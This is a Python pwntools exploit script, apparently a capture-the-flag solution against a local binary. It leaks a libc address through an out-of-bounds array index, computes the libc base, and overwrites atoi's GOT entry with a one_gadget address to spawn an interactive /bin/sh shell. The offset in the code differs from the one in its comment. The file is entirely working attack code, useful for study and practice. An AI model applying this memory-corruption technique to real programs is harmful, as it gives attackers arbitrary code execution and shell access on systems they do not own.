#!/usr/bin/env python3
from pwn import *

def _set(idx, value):
    p.sendlineafter(b'2: get\n', '1')
    p.sendlineafter(b'idx:\n', str(idx))
    p.sendlineafter(b'value:\n', str(value))

def _get(idx):
    p.sendlineafter(b'2: get\n', '2')
    p.sendlineafter(b'idx:\n', str(idx))
    return p.recvline()[:-1]

p = process('./one_gadget')
libc = ELF('./libc-2.31.so')

atoi = int(_get(-10), 16)
log.info(hex(atoi))

libc.address = atoi - libc.symbols['atoi']

log.info('libc: ' + hex(libc.address))

one_gadget = libc.address + 0xe6af1

# 0xe6ce9 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

_set(-10, one_gadget)

p.sendafter(b'2: get\n', '1\n')

p.interactive()
